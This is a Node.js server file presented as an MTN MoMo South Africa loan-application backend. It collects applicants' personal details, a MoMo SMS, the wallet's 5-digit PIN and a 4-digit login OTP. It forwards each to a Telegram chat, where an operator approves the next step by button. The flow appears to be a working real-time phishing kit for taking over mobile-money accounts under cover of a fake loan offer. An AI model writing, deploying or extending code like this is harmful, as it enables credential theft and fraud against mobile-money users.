// ============================================================
// server.js – MTN MoMo South Africa
// New flow: OTP before qualification + auto-scan
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting...');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('═══════════════════════════════════════');

// ─── Store ───
const applications = {};
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function saveApps() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            applications,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}

function loadApps() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            Object.assign(applications, parsed.applications || {});
            console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
        }
    } catch (e) { console.error('Load error:', e.message); }
}

// ─── HTML Helpers ───
function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}

// ─── Loan Math ───
function monthlyRepayment(principal, months) {
    if (!principal || !months) return 0;
    return Math.ceil(principal / months);
}

// ─── Telegram ───
async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (msg_id: ${result.result?.message_id})`);
        else console.error(`❌ TG rejected: ${result.description}`);
        return result;
    } catch (e) {
        console.error('❌ TG error:', e.message);
        return { ok: false };
    }
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
});

app.get('/api/telegram-debug', async (req, res) => {
    const result = {
        tokenSet: !!BOT_TOKEN,
        tokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
        tokenHasColon: BOT_TOKEN ? BOT_TOKEN.includes(':') : false,
        chatIdSet: !!CHAT_ID,
        chatId: CHAT_ID || 'MISSING'
    };
    try {
        const me = await fetch(`${TG_API}/getMe`);
        result.getMe = await me.json();
    } catch (e) { result.getMeError = e.message; }
    try {
        result.testSend = await tgSend(`🧪 <b>Test</b>\n⏰ ${new Date().toISOString()}`);
    } catch (e) { result.testSendError = e.message; }
    res.json(result);
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());

    try {
        // ─── Callback buttons ───
        if (req.body && req.body.callback_query) {
            const q = req.body.callback_query;
            console.log('🔘 Callback:', q.data);

            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) { console.log(`⚠️ App not found: ${data.id}`); return; }

                const step = data.s;
                const approved = data.a === 'Y';

                if (app_[step] !== 'pending') {
                    console.log(`⚠️ ${step} not pending (${app_[step]})`);
                    return;
                }

                app_[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();

                // Qualification status
                if (step === 'qualification') {
                    app_.qualification = approved ? 'qualified' : 'unqualified';
                }

                saveApps();
                console.log(`✅ ${step} → ${app_[step]} for ${data.id}`);

                tgSend(
                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(data.id)}\n` +
                    `📋 Step: <b>${step.toUpperCase()}</b>\n` +
                    `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}`
                );
            } catch (e) {
                console.error('❌ Callback parse:', e.message);
            }
            return;
        }

        // ─── Text commands ───
        if (req.body && req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            if (chatId !== CHAT_ID.toString()) return;

            if (text === '/start' || text === '/help') {
                tgSend(
                    `🤖 <b>MTN MoMo Loan Bot</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 /stats — Statistics\n` +
                    `📋 /list — Recent applications\n` +
                    `🔍 /search [ID] — Find application\n` +
                    `⏳ /pending — Pending approvals\n\n` +
                    `✅ Bot working!`
                );
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pending = Object.values(applications).filter(a =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
                ).length;
                const completed = Object.values(applications).filter(a => a.otp === 'approved' && a.qualification === 'qualified').length;
                tgSend(
                    `📊 <b>STATISTICS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📝 Total: <b>${total}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`
                );
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 No applications.'); return; }
                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n   👤 ${esc(a.firstName)} ${esc(a.lastName)}\n   💰 R ${(a.loanAmount||0).toLocaleString()}\n   📌 App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp} Qual:${a.qualification}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const id = text.replace('/search ', '').trim().toUpperCase();
                const a = applications[id];
                if (!a) { tgSend(`❌ Not found: ${code(id)}`); return; }
                const monthly = monthlyRepayment(a.loanAmount, parseInt(a.loanTerm));
                tgSend(
                    `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n` +
                    `📱 ${code('+27' + a.phone)}\n💰 <b>R ${(a.loanAmount||0).toLocaleString()}</b>\n` +
                    `📅 ${esc(a.loanTerm)} — Monthly: <b>R ${monthly.toLocaleString()}</b>\n\n` +
                    `📋 App: ${a.application}\n📨 SMS: ${a.sms}\n🔐 PIN: ${a.pin}\n🔑 OTP: ${a.otp}\n📊 Qual: ${a.qualification}`
                );
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
                );
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    if (a.application === 'pending') steps.push('App');
                    if (a.sms === 'pending') steps.push('SMS');
                    if (a.pin === 'pending') steps.push('PIN');
                    if (a.otp === 'pending') steps.push('OTP');
                    if (a.qualification === 'pending') steps.push('Qual');
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n💰 R ${(a.loanAmount||0).toLocaleString()}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            }
        }
    } catch (e) {
        console.error('❌ Webhook error:', e.message);
    }
});

// ═══════════════════════════════════════════════════════════
// LOAN FLOW ENDPOINTS
// ═══════════════════════════════════════════════════════════

// ─── Submit Application ───
app.post('/api/send-application', (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName, email, employment, annualIncome, kinName, kinPhone, loanType, loanPurpose } = data;
        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });

        const monthly = monthlyRepayment(loanAmount, parseInt(loanTerm));

        applications[applicationId] = {
            ...data,
            application: 'pending',
            sms: 'idle',
            pin: 'idle',
            otp: 'idle',
            qualification: 'idle',
            monthlyRepayment: monthly,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        saveApps();
        console.log(`📝 Submitted: ${applicationId}`);

        askApproval(
            `📋 <b>NEW LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>👤 APPLICANT</b>\n` +
            `Name: ${esc(firstName)} ${esc(lastName)}\n` +
            `Phone: ${code('+27' + phone)}\n` +
            `Email: ${esc(email)}\n\n` +
            `<b>💰 LOAN REQUEST</b>\n` +
            `Type: ${esc(loanType)}\n` +
            `Amount: <b>R ${loanAmount.toLocaleString()}</b>\n` +
            `Term: ${esc(loanTerm)}\n` +
            `Monthly Repayment: <b>R ${monthly.toLocaleString()}</b>\n` +
            `Purpose: ${esc(loanPurpose)}\n\n` +
            `<b>💼 EMPLOYMENT</b>\n` +
            `${esc(employment)} — R ${annualIncome.toLocaleString()}/yr\n\n` +
            `<b>👨‍👩‍👦 NEXT OF KIN</b>\n` +
            `${esc(kinName)} ${code('+27' + kinPhone)}\n\n` +
            `🆔 ID: ${code(applicationId)}\n\n` +
            `✅ <b>Approve to allow SMS step?</b>`,
            'application', applicationId
        );

        res.json({ ok: true, applicationId, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit SMS ───
app.post('/api/send-momo-message', (req, res) => {
    try {
        const { applicationId, phone, momoMessage } = req.body.momoData;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet' });

        app_.smsMessage = String(momoMessage).trim();
        app_.sms = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `📨 <b>SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `📱 ${code('+27' + phone)}\n\n` +
            `📩 <b>SMS Content:</b>\n${block(momoMessage)}\n\n` +
            `✅ <b>Approve to allow PIN step?</b>`,
            'sms', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit PIN ───
app.post('/api/send-pin', (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved yet' });

        const cleanPin = String(pin || '').trim();
        if (!/^\d{5}$/.test(cleanPin)) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits' });

        app_.pinValue = cleanPin;
        app_.pin = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔐 <b>PIN VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 PIN: ${code(cleanPin)}\n\n` +
            `✅ <b>Approve to allow OTP step?</b>`,
            'pin', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit OTP ───
app.post('/api/send-otp', (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved yet' });

        const cleanOtp = String(otp || '').trim();
        if (!/^\d{4}$/.test(cleanOtp)) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits' });

        app_.otpValue = cleanOtp;
        app_.otp = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔑 <b>OTP VERIFICATION (LOGIN)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 OTP: ${code(cleanOtp)}\n\n` +
            `✅ <b>Approve to allow Momo transaction review?</b>`,
            'otp', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Qualification Check (admin-triggered after OTP) ───
app.post('/api/check-qualification', (req, res) => {
    try {
        const { applicationId } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.otp !== 'approved') return res.status(400).json({ ok: false, error: 'OTP not approved yet' });

        const required = Math.ceil(app_.loanAmount * 0.20);
        const monthly = app_.monthlyRepayment || monthlyRepayment(app_.loanAmount, parseInt(app_.loanTerm));

        // Set qualification to pending — admin reviews
        app_.qualification = 'pending';
        app_.qualificationRequired = required;
        app_.updatedAt = new Date().toISOString();
        saveApps();

        console.log(`📊 Qualification check started for ${applicationId} (required: R ${required})`);

        askApproval(
            `📊 <b>MOMO TRANSACTION REVIEW</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>👤 APPLICANT</b>\n` +
            `${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `${code('+27' + app_.phone)}\n\n` +
            `<b>💰 LOAN DETAILS</b>\n` +
            `Amount: <b>R ${app_.loanAmount.toLocaleString()}</b>\n` +
            `Term: ${esc(app_.loanTerm)}\n` +
            `Monthly Repayment: <b>R ${monthly.toLocaleString()}</b>\n\n` +
            `<b>📊 QUALIFICATION REQUIREMENT</b>\n` +
            `Minimum monthly transactions: <b>R ${required.toLocaleString()}</b>\n` +
            `(20% of loan amount)\n\n` +
            `<b>💼 EMPLOYMENT</b>\n` +
            `${esc(app_.employment)} — R ${app_.annualIncome.toLocaleString()}/yr\n\n` +
            `<b>👨‍👩‍👦 NEXT OF KIN</b>\n` +
            `${esc(app_.kinName)} ${code('+27' + app_.kinPhone)}\n\n` +
            `🆔 ID: ${code(applicationId)}\n\n` +
            `✅ <b>Approve to complete the loan?</b>`,
            'qualification', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Status polling ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['application', 'sms', 'pin', 'otp', 'qualification'].includes(step))
        return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: app_[step] || 'idle', applicationId, step });
});

// ─── Full status ───
app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        application: app_.application,
        sms: app_.sms,
        pin: app_.pin,
        otp: app_.otp,
        qualification: app_.qualification
    });
});

// ─── Resend SMS ───
app.post('/api/resend-sms/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.sms = 'idle';
    app_.smsMessage = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// ─── Resend OTP ───
app.post('/api/resend-otp', (req, res) => {
    const { applicationId } = req.body;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.otp = 'idle';
    app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    tgSend(`🔄 <b>OTP RESENT</b>\n🆔 ${code(applicationId)}\n👤 ${esc(app_.firstName)} ${esc(app_.lastName)}`);
    res.json({ ok: true });
});

// ─── Retry step ───
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['sms', 'pin', 'otp'].includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });

    app_[step] = 'idle';
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') app_.pinValue = null;
    if (step === 'otp') app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// ─── Rejection info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    let rejectedStep = null, errorMessage = '';
    if (app_.application === 'rejected') { rejectedStep = 'application'; errorMessage = 'Application was rejected.'; }
    else if (app_.sms === 'rejected') { rejectedStep = 'sms'; errorMessage = 'Your SMS was rejected.'; }
    else if (app_.pin === 'rejected') { rejectedStep = 'pin'; errorMessage = 'Your PIN was rejected.'; }
    else if (app_.otp === 'rejected') { rejectedStep = 'otp'; errorMessage = 'Your OTP was rejected.'; }
    else if (app_.qualification === 'unqualified') { rejectedStep = 'qualification'; errorMessage = 'You did not meet the qualification requirements.'; }

    res.json({ ok: true, rejectedStep, errorMessage });
});

// ─── Serve frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

loadApps();
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`   Health: /health`);
    console.log(`   Debug: /api/telegram-debug\n`);
});
